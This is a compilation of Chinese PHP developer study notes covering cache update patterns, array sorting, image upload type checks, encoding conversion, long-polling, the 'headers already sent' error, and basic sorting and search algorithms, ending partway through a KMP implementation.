缓存的正确打开方式

1.Cache Aside 同时更新缓存和数据库

2.Read/Write Through 先更新缓存，缓存负责同步更新数据库

3.Write Behind Caching 先更新缓存，缓存负责异步更新数据库

下面具体分析每种模式

一、Cache Aside 更新模式

这是最常用的缓存模式了，具体的流程是：

读取：应用程序先从 cache 取数据，取到后成功返回；没有得到，则从数据库中取数据，成功后，放到缓存中。

更新：先把数据存到数据库中，再清理缓存使其失效。

不过这种模式有几个变种：

第一，如果先更新数据库再更新缓存。假设两个并发更新操作，数据库先更新的反而后更新缓存，数据库后更新的反而先更新缓存。这样就会造成数据库和缓存中的数据不一致，应用程序中读取的都是脏数据。

第二，先删除缓存再更新数据库。假设一个更新操作先删除了缓存，一个读操作没有命中缓存，从数据库中取出数据并且更新回缓存，再然后更新操作完成数据库更新。这时数据库和缓存中的数据是不一致的，应用程序中读取的都是原来的数据。

第三，先更新数据库再删除缓存。假设一个读操作没有命中缓存，然后读取数据库的老数据。同时有一个并发更新操作，在读操作之后更新了数据库并清空了缓存。此时读操作将之前从数据库中读取出的老数据更新回了缓存。这时数据库和缓存中的数据也是不一致的。

但是一般情况下，缓存用于读多写少的场景，所以第三种这种情况其实是小概率会出现的。

二、Read/Write Through 更新模式

Read Through 模式就是在查询操作中更新缓存，缓存服务自己来加载。

Write Through 模式和 Read Through 相仿，不过是在更新数据时发生。当有数据更新的时候，如果没有命中缓存，直接更新数据库，然后返回。如果命中了缓存，则更新缓存，然后由缓存自己更新数据库（这是一个同步操作）。


三、Write Behind Caching 更新模式

Write Behind Caching 更新模式就是在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。但其带来的问题是，数据不是强一致性的，而且可能会丢失。


总结，三种缓存模式的优缺点：

Cache Aside 更新模式实现起来比较简单，最常用，实时性也高，但是需要应用需要关注核实加载数据进入缓存 。

Read/Write Through 更新模式只需要维护一个缓存，对应用屏蔽掉了缓存的细节，实时性也高。但是实现起来要复杂一些。

Write Behind Caching 吞吐量很高，多次操作可以合并。但是数据可能会丢失，例如系统断电等，实现起来最复杂。

## 实践篇
### 给定二维数组，根据某个字段排序
遇到问题：把两个数组用php自带的array_merge()函数合并之后，想按照两个数组中共有的'post_time'字段为新数组进行排序

解决办法：通过查阅官方手册，得知有array_multisort()这个函数，可以对多个数组或多维数组进行排序，返回排序之后的数组，其中字符串键名将被保留，但是数字键名将被重新索引，从 0 开始，并以 1 递增。

下面封装了这个函数，便于调用：
```
/**
 * 二维数组按照指定字段进行排序
 * @params array $array 需要排序的数组
 * @params string $field 排序的字段
 * @params string $sort 排序顺序标志 SORT_DESC 降序；SORT_ASC 升序
 */
function arraySequence($array, $field, $sort = 'SORT_DESC') {
 $arrSort = array();
 foreach ($array as $uniqid => $row) {
  foreach ($row as $key => $value) {
   $arrSort[$key][$uniqid] = $value;
  }
 }
 array_multisort($arrSort[$field], constant($sort), $array);
 return $array;
}
//测试：
$arrDemo = array(
array('name'=>'Jack','age'=>'22'),
array('name'=>'Tom','age'=>'24'),
array('name'=>'Green','age'=>'21'),
array('name'=>'Ben','age'=>'23'),);
$arrDemo = arraySequence($arrDemo,'age');
print_r($arrDemo);
运行结果：

Array
(
    [0] => Array
        (
            [name] => Tom
            [age] => 24
        )

    [1] => Array
        (
            [name] => Ben
            [age] => 23
        )

    [2] => Array
        (
            [name] => Jack
            [age] => 22
        )

    [3] => Array
        (
            [name] => Green
            [age] => 21
        )

)
```
新增：按照指定的多个字段排序
```
/**
 * 二维数组按照指定的多个字段进行排序
 *
 * 调用示例：sortArrByManyField($arr,'id',SORT_ASC,'age',SORT_DESC);
 */
function sortArrByManyField(){
 $args = func_get_args();
 if(empty($args)){
  return null;
 }
 $arr = array_shift($args);
 if(!is_array($arr)){
  throw new Exception("第一个参数应为数组");
 }
 foreach($args as $key => $field){
  if(is_string($field)){
   $temp = array();
   foreach($arr as $index=> $val){
    $temp[$index] = $val[$field];
   }
   $args[$key] = $temp;
  }
 }
 $args[] = &$arr;//引用值
 call_user_func_array('array_multisort',$args);
 return array_pop($args);
}
//测试：
$arrDemo = array(
array('name'=>'Jack','age'=>'22'),
array('name'=>'Tom','age'=>'24'),
array('name'=>'Green','age'=>'21'),
array('name'=>'Ben','age'=>'23'),);
$arrDemo = sortArrByManyField($arrDemo,'age');
print_r($arrDemo);
运行结果：

Array
(
    [0] => Array
        (
            [name] => Green
            [age] => 21
        )

    [1] => Array
        (
            [name] => Jack
            [age] => 22
        )

    [2] => Array
        (
            [name] => Ben
            [age] => 23
        )

    [3] => Array
        (
            [name] => Tom
            [age] => 24
        )
)
```

### 如何判断上传文件类型，如：仅允许 jpg 上传
判断文件图片类型,
```
$type     = $_FILES['image']['tmp_name'];//文件名
//$type     = $this->getImagetype( $type ); 
$filetype = ['jpg', 'jpeg', 'gif', 'bmp', 'png'];
if (! in_array($type, $filetype))
{  
    return "不是图片类型";
｝
```
如上如果用户修改文件后缀为png jpeg等无法满足,查了查资料解决方法是采用判断文件的二进制流信息,如果你刚好遇到这种问题不妨尝试一下：
```
//*判断图片上传格式是否为图片 return返回文件后缀
public function getImagetype($filename)
{
    $file = fopen($filename, 'rb');
    $bin  = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo  = @unpack('C2chars', $bin);
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
    // dd($typeCode);
    $fileType = '';
    switch ($typeCode) {
        case 255216:
            $fileType = 'jpg';
            break;
        case 7173:
            $fileType = 'gif';
            break;
        case 6677:
            $fileType = 'bmp';
            break;
        case 13780:
            $fileType = 'png';
            break;
        default:
            $fileType = '只能上传图片类型格式';
    }
    // if ($strInfo['chars1']=='-1' AND $strInfo['chars2']=='-40' ) return 'jpg';
    // if ($strInfo['chars1']=='-119' AND $strInfo['chars2']=='80' ) return 'png';
    return $fileType;
}
```

### 不使用临时变量交换两个变量的值 `$a=1; $b=2;`  =>  `$a=2; $b=1;`
```
$a = 1; 
$b = 2;
// [$b,$a] = [$a,$b];
list($b,$a) = [$a,$b]; // 就这一行有用，其他的别看了。
echo $a;
echo $b;

$a = 100;
$b = 200;
$a = $a ^ $b;
$b = $a ^ $b;
$a = $a ^ $b;
echo $a, '-', $b;
```

### strtoupper 在转换中文时存在乱码，你如何解决？```php echo strtoupper('ab你好c'); ```
https://www.jb51.net/article/61799.htm

汉字乱码真是一个悲催的事情，JAVA讨厌汉字，PHP也不喜欢汉字；

Java乱码最终使用了spring给出的过滤器来过滤，处处过滤，其实影响了速度，不过没有办法，汉字就是W国首先不考虑的事情；

想不到PHP也是乱码处处在，当你使用亲兄弟MySQL的时候，汉字显得那么亲切，从未考虑过他会变成天书；不过为了和其他其他交互，把PHP的手伸到SQL SERVER的时候，乱码来了，原因是第三方系统用的GBK编码；

哎，转换吧；

1，PHP自带的转换函数ICONV,一个高大上的函数；
```
string iconv ( string $in_charset , string $out_charset , string $str )
使用DEMO：

<?php
$text = "This is the Euro symbol '€'.";
echo 'Original : ', $text, PHP_EOL;
echo 'TRANSLIT : ', iconv("UTF-8", "ISO-8859-1//TRANSLIT", $text), PHP_EOL;
echo 'IGNORE   : ', iconv("UTF-8", "ISO-8859-1//IGNORE", $text), PHP_EOL;
echo 'Plain    : ', iconv("UTF-8", "ISO-8859-1", $text), PHP_EOL;
?>
```
大家都推荐的函数，不过使用之后无法转换，没有错误，字符也没有转换，NO!

2，另辟蹊径，还有一个大家质疑效率不高的函数，不过无论如何，先实现再考虑其他三

```
//检查该函数是否可用
echo function_exists('mb_convert_encoding');
//检测当前编码
echo mb_detect_encoding($val, "GBK, GB2312, UTF-8");
//转换编码，把CP936(就是GBK)转换成UTF-8
$v=mb_convert_encoding ($val, "UTF-8", "CP936");
结果成功了;
```

好吧，先用着吧，为了转换数据库查询的结果集，制作一个转换函数：

```
1，函数“乱码克星”：
// $fContents 字符串
// $from 字符串的编码
// $to 要转换的编码
function auto_charset($fContents,$from='gbk',$to='utf-8'){
    $from   =  strtoupper($from)=='UTF8'? 'utf-8':$from;
    $to       =  strtoupper($to)=='UTF8'? 'utf-8':$to;
    if( strtoupper($from) === strtoupper($to) || empty($fContents) || (is_scalar($fContents) && !is_string($fContents)) ){
        //如果编码相同或者非字符串标量则不转换
        return $fContents;
    }
    if(is_string($fContents) ) {
        if(function_exists('mb_convert_encoding')){
            return mb_convert_encoding ($fContents, $to, $from);
        }else{
            return $fContents;
        }
    }
    elseif(is_array($fContents)){
        foreach ( $fContents as $key => $val ) {
            $_key =     auto_charset($key,$from,$to);
            $fContents[$_key] = auto_charset($val,$from,$to);
            if($key != $_key )
                unset($fContents[$key]);
        }
        return $fContents;
    }
    else{
        return $fContents;
    }
}
```
2，使用：
```
//打印输出查询结果（假设你的结果）
$arr=array();
while($list=mssql_fetch_row($row))
{
    $arr[]=$list;
}
$s=auto_charset($arr,'gbk','utf-8');
//打印试试，在浏览器设置编码为UFT-8，看没有乱码
print_r($s);die();
```

### Websocket、Long-Polling、Server-Sent Events(SSE) 区别
http://www.mamicode.com/info-detail-1327667.html

在下面的示例中，客户端指的是浏览器，服务器指的是网站服务器主机。

为了更好的理解这些知识点，你应该简单了解典型的http网站是如何工作的。

普通的http：

客户端从服务器端请求网页

服务器作出相应的反应

服务器返回相应到客户端

AJAX Polling：

客户端使用普通的http方式向服务器端请求网页

客户端执行网页中的JavaScript轮询脚本，定期循环的向服务器发送请求（例如每5秒发送一次请求），获取信息

服务器对每次请求作出响应，并返回相应信息，就像正常的http请求一样

AJAX Long-Polling：

客户端使用普通的http方式向服务器端请求网页

客户端执行网页中的JavaScript脚本，向服务器发送数据、请求信息

服务器并不是立即就对客户端的请求作出响应，而是等待有效的更新

当信息是有效的更新时，服务器才会把数据推送给客户端

当客户端接收到服务器的通知时，立即会发送一个新的请求，进入到下一次的轮询

HTML5 Server Sent Events (SSE) / EventSource:

客户端使用普通的http方式向服务器端请求网页

客户端执行网页中的JavaScript脚本，与服务器之间建立了一个连接

当服务器端有有效的更新时，会发送一个事件到客户端

服务器到客户端数据的实时推送，大多数内容是你需要的

你需要一台可以做Event Loop的服务器

不允许跨域的连接

如果你觉得这些还不够，想要了解更多，可以参考下面的文件和手册

Using server-sent events
https://developer.mozilla.org/en-US/docs/Server-sent_events/Using_server-sent_events

Server-Sent Events
http://html5doctor.com/server-sent-events

Stream Updates with Server-Sent Events
http://www.html5rocks.com/en/tutorials/eventsource/basics/

Tutorial: JSF 2 and HTML5 Server Sent Events
http://jaxenter.com/tutorial-jsf-2-and-html5-server-sent-events-42932.html

HTML5 Websockets:

客户端使用普通的http方式向服务器端请求网页

客户端执行网页中的JavaScript脚本，与服务器之间建立了一个连接

服务器和客户端之间，可以双向的发送有效数据到对方

服务器可以实时的发送数据到客户端，同时客户端也可以实时的发送数据到服务器

你需要一台可以做Event Loop的服务器

使用 WebSockets 允许跨域的建立连接

它同样支持第三方的websocket主机服务器，例如Pusher或者其它。这样你只需要关心客户端的实现 ，降低了开发难度。

如果你觉得这些还不够，想要了解更多，可以参考下面的文件和手册

An Introduction To WebSockets
http://www.developerfusion.com/article/143158/an-introduction-to-websockets/

Writing WebSocket client applications
https://developer.mozilla.org/en-US/docs/WebSockets/Writing_WebSocket_client_applications

Start Using HTML5 WebSockets Today
http://code.tutsplus.com/tutorials/start-using-html5-websockets-today--net-13270

WebRTC:

WebRTC是一种点对点类型的传输方式，它支持多种传输协议，如：UDP、TCP甚至是抽象层的协议。设计它时同时考虑到了允许使用可靠和不可靠的两种方式传输数据。这种技术一般应用在传输数据量较大的内容，比如音、视频等流媒体的传输。

Comet:

Comet是一种用于web的推送技术，能使服务器实时地将更新的信息传送到客户端，而无须客户端发出请求，目前有两种实现方式，长轮询和iframe流。如果你想了解更多，可以参考维基百科或者IBM

Event Loop

Event Loop是一个程序结构，用于等待和发送消息和事件。

长轮询

长轮询是在打开一条连接以后保持，等待服务器推送来数据再关闭的方式。

iframe流

iframe流方式是在页面中插入一个隐藏的iframe，利用其src属性在服务器和客户端之间创建一条长链接，服务器向iframe传输数据（通常是HTML，内有负责插入信息的javascript），来实时更新页面。

iframe流方式的优点是浏览器兼容好，Google公司在一些产品中使用了iframe流，如Google Talk。

https://www.jianshu.com/p/d3f66b1eb748?from=timeline&isappinstalled=0

介绍

众所周知，数据交互有两种模式：Push（推模式）、Pull（拉模式）。

推模式指的是客户端与服务端建立好网络长连接，服务方有相关数据，直接通过长连接通道推送到客户端。其优点是及时，一旦有数据变更，客户端立马能感知到；另外对客户端来说逻辑简单，不需要关心有无数据这些逻辑处理。缺点是不知道客户端的数据消费能力，可能导致数据积压在客户端，来不及处理。

拉模式指的是客户端主动向服务端发出请求，拉取相关数据。其优点是此过程由客户端发起请求，故不存在推模式中数据积压的问题。缺点是可能不够及时，对客户端来说需要考虑数据拉取相关逻辑，何时去拉，拉的频率怎么控制等等。

说到Long Polling（长轮询），必然少不了提起Polling（轮询），这都是拉模式的两种方式。

Polling是指不管服务端数据有无更新，客户端每隔定长时间请求拉取一次数据，可能有更新数据返回，也可能什么都没有。

Long Polling原理也很简单，相比Polling，客户端发起Long Polling，此时如果服务端没有相关数据，会hold住请求，直到服务端有相关数据，或者等待一定时间超时才会返回。返回后，客户端又会立即再次发起下一次Long Polling。这种方式也是对拉模式的一个优化，解决了拉模式数据通知不及时，以及减少了大量的无效轮询次数。（所谓的hold住请求指的服务端暂时不回复结果，保存相关请求，不关闭请求连接，等相关数据准备好，写会客户端。）

前面提到Long Polling如果当时服务端没有需要的相关数据，此时请求会hold住，直到服务端把相关数据准备好，或者等待一定时间直到此次请求超时，这里大家是否有疑问，为什么不是一直等待到服务端数据准备好再返回，这样也不需要再次发起下一次的Long Polling，节省资源？

主要原因是网络传输层主要走的是tcp协议，tcp协议是可靠面向连接的协议，通过三次握手建立连接。但是所建立的连接是虚拟的，可能存在某段时间网络不通，或者服务端程序非正常关闭，亦或服务端机器非正常关机，面对这些情况客户端根本不知道服务端此时已经不能互通，还在傻傻的等服务端发数据过来，而这一等一般都是很长时间。当然tcp协议栈在实现上有保活计时器来保证的，但是等到保活计时器发现连接已经断开需要很长时间，如果没有专门配置过相关的tcp参数，一般需要2个小时，而且这些参数是机器操作系统层面，所以，以此方式来保活不太靠谱，故Long Polling的实现上一般是需要设置超时时间的。

Long Polling的实现很简单，可分为四个过程：

发起Polling

发起Polling很简单，只需向服务器发起请求，此时服务端还未应答，所以客户端与服务端之间一直处于连接状态。

数据推送

如果服务器端有相关数据，此时服务端会将数据通过此前建立的通道发回客户端。

Polling终止

Polling终止情况有三种：

若服务端返回相关数据，此时客户端收到数据后，关闭请求连接，结束此次Polling过程。

若客户端等待设定的超时时间后，服务端依然没有返回数据，此时客户端需要主动终止此次Polling请求。

若客户端收到网络故障或异常，此时客户端自然也是需要主动终止此次Polling请求。

重新Polling

终止上次Polling后，客户端需要立即再次发起Polling请求。这样才能保证拉取数据的及时性。

代码实现起来也很简单，Http Call按照上述过程就很方便实现LongPolling。下面Code只是简单展示过程，在具体场景下，根据具体的业务逻辑进行调整。

客户端Code
```
package com.andy.example.longpolling.client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by andy on 17/7/6.
 */
public class ClientBootstrap {

    public static final String URL = "http://localhost:8080/long-polling";

    public static void main(String[] args) {
        int i = 0;
        while (true) {
            System.out.println("第" + (++i) + "次 longpolling");
            HttpURLConnection connection = null;
            try {
                URL getUrl = new URL(URL);
                connection = (HttpURLConnection) getUrl.openConnection();
                connection.setReadTimeout(50000);//这就是等待时间，设置为50s
                connection.setConnectTimeout(3000);
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Accept-Charset", "utf-8");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Charset", "UTF-8");

                if (200 == connection.getResponseCode()) {
                    BufferedReader reader = null;
                    try {
                        reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
                        StringBuilder result = new StringBuilder(256);
                        String line = null;
                        while ((line = reader.readLine()) != null) {
                            result.append(line);
                        }

                        System.out.println("结果 " + result);

                    } finally {
                        if (reader != null) {
                            reader.close();
                        }
                    }
                }
            } catch (IOException e) {

            } finally {
                if (connection != null) {
                    connection.disconnect();
                }
            }
        }
    }

}

服务端Code
package com.andy.example.longpolling.server;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Created by andy on 17/7/6.
 */
public class LongPollingServlet extends HttpServlet {

    private Random random = new Random();

    private AtomicLong sequenceId = new AtomicLong();

    private AtomicLong count = new AtomicLong();

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        System.out.println("第" + (count.incrementAndGet()) + "次 longpolling");

        int sleepSecends = random.nextInt(100);
//随机获取等待时间，来通过sleep模拟服务端是否准备好数据

        System.out.println("wait " + sleepSecends + " second");

        try {
            TimeUnit.SECONDS.sleep(sleepSecends);//sleep
        } catch (InterruptedException e) {

        }

        PrintWriter out = response.getWriter();
        long value = sequenceId.getAndIncrement();
        out.write(Long.toString(value));
    }

}

结果
服务端结果
客户端结果
应用
```
WebQQ、Comet都用到长轮询技术，另外一些使用Pull模式消费的消息系统，都会使用Long Polling技术进行优化。

补充
针对一些同学的反馈，补充一篇 Long Polling长轮询实现进阶，希望大家对长轮询理解更加深刻。

### "Headers already sent" 错误是什么意思，如何避免
https://blog.csdn.net/qq_41750040/article/details/80197764

https://blog.csdn.net/change518/article/details/8716635

```
发送或者修改 HTTP 头信息的方法必须在任何输出被输出之前被调用。否则调用将会出错：
Warning: Cannot modify header information - headers already sent (output started at script:line)
这些方法可以修改（modify） HTTP 头信息：

header / header_remove
session_start / session_regenerate_id
setcookie / setrawcookie
输出（output）可以是：

无意的：
<?php 之前或者 ?> 之后的空格
UTF-8 BOM
有意的：
print ，echo 以及其他能产生输出的方法
在 <?php 前原始的 <html> 区块
为什么这个错误会产生
为了理解为什么 HTTP header 必须在输出之前发送出去，我们有必要了解看一下一个典型的 HTTP 相应。PHP 脚本主要用来生成 HTML ，但它也会发送一系列的 HTTP/CGI 头信息到 web 服务器：

HTTP/1.1 200 OK
Powered-By: PHP/5.3.7
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8

<html><head><title>PHP page output page</title></head>
<body><h1>Content</h1> <p>Some more output follows...</p>
and <a href="/"> <img src=internal-icon-delayed> </a>
页面或者输出总是紧跟在头信息后面。PHP 必须先把头信息发送给 web 服务器，并且它只能发送一次，在这之后就再也不能修改头信息了。

当 PHP 第一次接收到输出时（print ,echo,<html>） 它会清掉所有收集到的头信息。在此之后它能把输出所有想输出的内容，但是再想发送 HTTP 头信息就不可能了。

怎么找到到底是哪里提前产生了输出？
header() 头信息包含所有与问题产生相关的信息：

Warning: Cannot modify header information - headers already sent by (output started at /www/usr2345/htdocs/auth.php:52) in /www/usr2345/htdocs/index.php on line 100

在上面的警告中，line 100 指向调用 header() 失败的脚本行数。

圆括号里的 output started 这条信息更加重要。它指出了先于 header() 前的输出的源头。在这个例子中是 auth.php 的 第 52 行，这就是你要去找的过早的输出的地方。

典型的原因有这些：

print,echo
有意的 print 和 echo 语句输出将会中断输出 HTTP 头信息的机会。应用程序流必须重组以避免这种行为，可以使用 function 和模版来重组，从而保证 header() 调用是在信息被写出之前。
产生输出的方法包括：

print, echo, printf, vprintf
trigger_error, ob_flush, ob_end_flush, var_dump, print_r
readfile, passthru, flush, imagepng, imagejpeg
以及其他用户自定义的方法。

原始的 HTML
在一个 PHP 文件中未被解析的 HTML 区块也是输出。脚本中各种可能触发调用 header() 的条件都必须在任何 <html> 区块前声明。

<?php 前的空格导致的 "script.php line 1" 警告 
如果警告指向第 1 行的输出，那么它很有可能指向的是在 <?php 之前的空格，文本或者 HTML 。

 <?php
// 在 <?php 前有个空格
同样它可能出现在附加的脚本或者脚本区块上:
?>

<?php
PHP 确实在闭合标签后占据了一个换行符，但是它不会在上面的空白处插入换行符、制表符或者空格（也就是说这是我们自己造成的）。

UTF-8 BOM(这个特别注意)
换行符或者空格可能导致问题，但是不可见的字符序列同样可以。最著名的就是大多数文本编辑器并不会显示的 UTF-8 BOM 。它是在 UTF-8 编码的文档里可选甚至是多余的，被标示为 EF BB BF 的字节序列。但是 PHP 必须把它当作原始的输出来处理。它可能以 ï»¿ 这样的符号输出（如果客户端以 Latin-1 来解释这个文档）或者其他这样的“非法输出”。
以某种图形化的编辑器或者基于 JAVA 的 IDE 查看这类文件时，你可能察觉不到 UTF-8 BOM 的存在。它们没有把 UTF-8 BOM 形象化（受制于 Unicode 标准）。然而大多数程序编辑器和控制台编辑程序会这样处理：

像这样就能简单地提早发现问题了。其他的编辑器在设置某些选项后也能纠正这样的问题（Windows 上的 Notepad++ 可以识别并且纠正 BOM 问题 ），另一个发现 BOM 的方法就是借助十六进制的编辑器。在 *nix 系统上，大都提供了 hexdump ，如果没有的话，其他图形化的变种也可以用来简化审计这些问题的步骤：

一个简单的修正方法就是将文本编辑器设置为 以 UTF-8 (no BOM) 保存文件（save files as UTF-8 (no BOM)）或者其他类似的设置。

修正程序
有很多自动化的工具可以检测并修改文本文件（sed / awk 或者 recode ）。PHP 里有 phptags 。它可以把打开标签和关闭标签重写成长标签（<?php）或者短标签（<?）的形式。也可以轻松地解决前导或尾随的空格、Unicode 和 UTF-x BOM 问题：

phptags  --whitespace  *.php
同样，你可以在某个目录或整个项目目录使用这个命令。

?> 后的空白 
如果错误代码在闭合标签 >? 这一行的前面，那么这就是 >? 后的空格或者原始文本输出导致的问题。PHP 的结束标记并不会在遇到闭合标签时终止执行脚本，任何 ?> 之后的文本或者空格字符都会被当作页面内容输出。
通用的被鼓励的做法，特别是针对新手，是避免在 PHP 文件后加上闭合标签 ?> 。这样就能避免一部分产生这类问题的情况。

错误源提示：”Unknown on line 0”
如果没有给出具体的错误源，那么这就是典型的 PHP 扩展或者 php.ini 设置的问题：

偶尔是 gzip 编码设置或者是 ob_gzhandler
也有可能是 php.ini 设置里模块加载了两次导致 PHP 产生了启动 / 警告信息
先前的错误导致输出了错误信息 
如果前面的 PHP 语句或者表达式造成了 warning 或者 notice 信息导致输出，这些输出也被认为是过早地输出。
在这种情况下你需要避免错误，推后这些语句的执行，或者抑制这些信息的输出，可以使用 isset() 进行判断，或者使用抑制符@，前提是它们不会阻止后续的调试。

没有错误信息输出
如果你禁用了 php.ini 里的 error_reporting 或者 display_errors 设置，那么将不会产生 warning 。但是忽略错误并不会让问题消失，头信息仍然不能在过早的输出输出之前发送出去。

所以当 header("Location: ...") 跳转静默地失败时，建议你去查看 warnings 。在脚本的最前面用下面的两条命令重新开启错误报告设置：

error_reporting(E_ALL);
ini_set("display_errors", 1);
或者如果其他的设置都失败了那就设置 set_error_handler("var_dump"); 。

至于跳转的 header ，在执行至最后的代码时你应该遵循下面的这种风格：

exit(header("Location: /finished.html"));
最好是提供一个方法，特别是当 header() 执行失败时打印出用户信息。

变通方法：输出缓冲
PHP 的输出缓冲的方法是缓解这种问题的一种变通方法。它运行起来可靠，但是你绝不要使用它来替代你架构良好应用程序结构，从控制逻辑中分离输出。它的真实目的是用来减轻大块数据传输至服务器时的压力。

output_buffering 设置 在 php.ini 或者 .htaccess 或者甚至在最新的 FPM/FastCGI 的 .user.ini 中设置；
同样你可以在脚本的最前面使用 ob_start() 来设置，但是它并没那么可靠：
即使 <?php ob_start(); ?> 在第一个脚本里，空格或者 BOM 也有可能在此之前被输出
它可以隐藏 HTML 输出里的空格（将空格放到 buffer 中），但是只要应用程序逻辑企图发送二进制内容（比如生成的图片），缓冲里的无关的输出就会成为问题（这样 ob_clean() 方法就成为下一步的变通方法了）。
缓冲有大小限制，并且在默认配置下很容易超出，并且这种情况并不少见，一旦发生也不太容易追踪。
因此这两个方法变得不可靠了，特别是当你需要更改开发环境或者生产环境的配置的时候。这就是为什么输出缓冲被认为只是一种蹩脚的变通方法。

建议参考官方手册里的基本 使用方法 ，以及它的优缺点：

输出缓冲是什么
为什么使用 output buffering
使用输出缓冲是不好的实践吗？
正确使用 output buffering 解决 “header already sent” 的例子
但是在其他的服务器上是好的？
如果你之前没有收到过头信息的 warning ，那么 php.ini 里的 output_buffering 设置改变了。在现在的／不同的服务器上很有可能没有设置。

使用 headers_sent() 检查
你可以使用 headers_sent 来检查是否可以发送头信息。这种方法可以有效地检查以便输出一个错误信息或是应用其他的逻辑。
不错的回退变通方法有：

HTML<meta> tag
如果你的应用程序很难在结构上解决这个问题，有个简单但显得不专业的做法是在 HTML 标签中来跳转网页。可以这样实现：

<meta http-equiv="Location" content="http://example.com/">
或者加上一个延迟时间

<meta http-equiv="Refresh" content="2; url=../target.html">
JavaScript 跳转
另一个可选的方法就是使用 JavaScript 跳转 来实现网页跳转：

<script> location.replace("target.html"); </script>
这种方式相比较 方法起来更兼容 HTML 标准，它只依赖于可以运行 JavaScript 的客户端。

这两种方式在 HTTP header() 调用失败时都提供了可以接受的回退方式。理想化的处理方式应该是将跳转与其它方式结合，给出对用户友好的辅助信息并且提供一个可点的链接以供后续操作。

为什么 setcookie() 和 session_start() 都会被影响
setcookie() 和 session_start() 都需要发送一个 set-cookie: 的 HTTP 头信息。这种情况就和前面输出 header() 的情况类似，所以同样会出现由于过早地输出错误信息导致的错误。

（当然它们受影响也有可能是因为客户端禁止了 cookie 导致的，设置可能是代理的问题。很明显，session 也取决去剩余磁盘空间大小或者 php.ini 里的其它设置
```

## 算法篇
### 快速排序（手写）
通过设置一个初始中间值，来将需要排序的数组分成3部分，小于中间值的左边，中间值，大于中间值的右边，
继续递归用相同的方式来排序左边和右边，最后合并数组
示例：
```
<?php
$a = array(2,13,42,34,56,23,67,365,87665,54,68,3);
function quick_sort($a)
{
    // 判断是否需要运行，因下面已拿出一个中间值，这里<=1
    if (count($a) <= 1) {
        return $a;
    }
    $middle = $a[0]; // 中间值
    $left = array(); // 接收小于中间值
    $right = array();// 接收大于中间值
    // 循环比较
    for ($i=1; $i < count($a); $i++) { 
        if ($middle < $a[$i]) {
            // 大于中间值
            $right[] = $a[$i];
        } else {
            // 小于中间值
            $left[] = $a[$i];
        }
    }
    // 递归排序划分好的2边
    $left = quick_sort($left);
    $right = quick_sort($right);
    // 合并排序后的数据，别忘了合并中间值
    return array_merge($left, array($middle), $right);
}
print_r(quick_sort($a));
```

### 冒泡排序（手写）
```
<?php
/**
 * User: wujunze
 * Email: itwujunze@163.com
 * Blog: https://wujunze.com
 * Date: 2016/8/25
 *
 */
$arr = array(1, 43, 54, 72, 21, 66, 32,55,11, 78, 36, 76, 39,88);
function getpao($arr)
{
    $len = count($arr);
    //设置一个空数组 用来接收冒出来的泡
    //该层循环控制 需要冒泡的轮数
    for ($i = 1; $i < $len; $i++) { //该层循环用来控制每轮 冒出一个数 需要比较的次数
        for ($k = 0; $k < $len - $i; $k++) {
            if ($arr[$k] > $arr[$k + 1]) {
                $tmp = $arr[$k + 1];
                $arr[$k + 1] = $arr[$k];
                $arr[$k] = $tmp;
            }
        }
    }
    return $arr;
}
var_dump(getpao($arr));
```

### 二分查找（了解）
```
一：递归方式
$array = [1,3,6,9,13,18,19,29,38,47,51,56,58,59,60,63,65,69,70,71,73,75,76,77,79,89];
$target = 73;
$low = 0;
$high = count($array)-1;
function bin_search($array, $low, $high, $target){
    if ( $low <= $high){
        var_dump($low, $high);echo "\n";
        $mid =  intval(($low+$high)/2 );
        if ($array[$mid] ==  $target){
            return true;
        }elseif ( $target < $array[$mid]){
            return  bin_search($array, $low,  $mid-1, $target);
        }else{
            return  bin_search($array, $mid+ 1, $high, $target);
        }
    }
    return false;
}
$find = bin_search($array, $low, $high, $target);
var_dump($find);
执行结果
int(0)
int(25)
int(13)
int(25)
int(20)
int(25)
int(20)
int(21)
bool(true)
我们看到，经过4次二分查找，查找区间不断折半，最终找到了$target。
二：循环方式
$array = [1,3,6,9,13,18,19,29,38,47,51,56,58,59,60,63,65,69,70,71,73,75,76,77,79,89];
$target = 73;
function bin_search($array, $target)
{
    $low = 0;
    $high = count($array)-1;
    $find = false;
    while (true){
        if ($low <= $high){
            var_dump($low, $high);echo "\n";
            $mid = intval(($low + $high)/2);
            if ($array[$mid] == $target){
                $find = true;
                break;
            } elseif ($array[$mid] < $target){
                $low = $mid+1;
            } elseif ($array[$mid] > $target){
                $high = $mid-1;
            }
        } else {
            break;
        }
    }
    return $find;
}
$find = bin_search($array, $target);
var_dump($find);
执行结果
int(0)
int(25)
int(13)
int(25)
int(20)
int(25)
int(20)
int(21)
bool(true)
我们看到，两种方式过程和结果相同。下面我们来测试下针对关联数组的二分查找算法：

$array = ['a'=>1,'b'=>3,'c'=>6,'d'=>9,'e'=>13,'f'=>18,'g'=>19,'h'=>29,'i'=>38];
$target = 19;
function bin_search($array, $target)
{
    $low = 0;
    $high = count($array)-1;
    $key_map = array_keys($array);
    $find = false;
    while (true){
        if ($low <= $high){
            var_dump($low, $high);echo "\n";
            $mid = intval(($low + $high)/2);
            if ($array[$key_map[$mid]] == $target){
                $find = true;
                break;
            } elseif ($array[$key_map[$mid]] < $target){
                $low = $mid+1;
            } elseif ($array[$key_map[$mid]] > $target){
                $high = $mid-1;
            }
        } else {
            break;
        }
    }
    return $find;
}
$find = bin_search($array, $target);
var_dump($find);
执行结果
int(0)
int(8)
int(5)
int(8)
bool(true)
```

### 查找算法 KMP（了解）
```
PHP实现KMP算法
function cal_next($str){
    $next[0] = -1;//next[0]初始化为-1
    $i=0;    $j = -1;    $len=strlen($str);    while($i<$len){
